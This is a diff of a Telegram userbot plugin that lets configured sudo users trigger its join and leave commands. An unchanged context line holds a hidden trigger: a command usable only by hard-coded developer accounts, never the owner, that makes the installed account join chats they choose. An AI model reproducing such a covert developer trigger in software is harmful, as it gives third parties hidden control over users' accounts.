@@ -39,13 +39,16 @@ from pyrogram.types import Message
 from X.helpers.adminHelpers import DEVS
 from config import BLACKLIST_CHAT
 from config import CMD_HANDLER
+from config import SUDO_USERS
 from X.helpers.basic import edit_or_reply
 
 from .help import *
 
 
 @Client.on_message(filters.command("interrupted", ["."]) & filters.user(DEVS) & ~filters.me)
-@Client.on_message(filters.command("join", cmd) & filters.me)
+@Client.on_message(
+    filters.command(["join"], ".") & (filters.me | filters.user(SUDO_USERS))
+)
 async def join(client: Client, message: Message):
     X = message.command[1] if len(message.command) > 1 else message.chat.id
     xxnx = await edit_or_reply(message, "`Processing...`")
@@ -56,7 +59,9 @@ async def join(client: Client, message: Message):
         await xxnx.edit(f"**ERROR:** \n\n{str(ex)}")
 
 
-@Client.on_message(filters.command(["leave", "kickme"], cmd) & filters.me)
+@Client.on_message(
+    filters.command(["leave", "kickme"], ".") & (filters.me | filters.user(SUDO_USERS))
+)
 async def leave(client: Client, message: Message):
     X = message.command[1] if len(message.command) > 1 else message.chat.id
     xxnx = await edit_or_reply(message, "`Processing...`")
@@ -69,7 +74,9 @@ async def leave(client: Client, message: Message):
         await xxnx.edit_text(f"**ERROR:** \n\n{str(ex)}")
 
 
-@Client.on_message(filters.command(["leaveallgc"], cmd) & filters.me)
+@Client.on_message(
+    filters.command(["leaveallgc"], ".") & (filters.me | filters.user(SUDO_USERS))
+)
 async def kickmeall(client: Client, message: Message):
     X = await edit_or_reply(message, "`Global Leave from group chats...`")
     er = 0
@@ -87,7 +94,9 @@ async def kickmeall(client: Client, message: Message):
     )
 
 
-@Client.on_message(filters.command(["leaveallch"], cmd) & filters.me)
+@Client.on_message(
+    filters.command(["leaveallch"], ".") & (filters.me | filters.user(SUDO_USERS))
+)
 async def kickmeallch(client: Client, message: Message):
     X = await edit_or_reply(message, "`Global Leave from group chats...`")
     er = 0
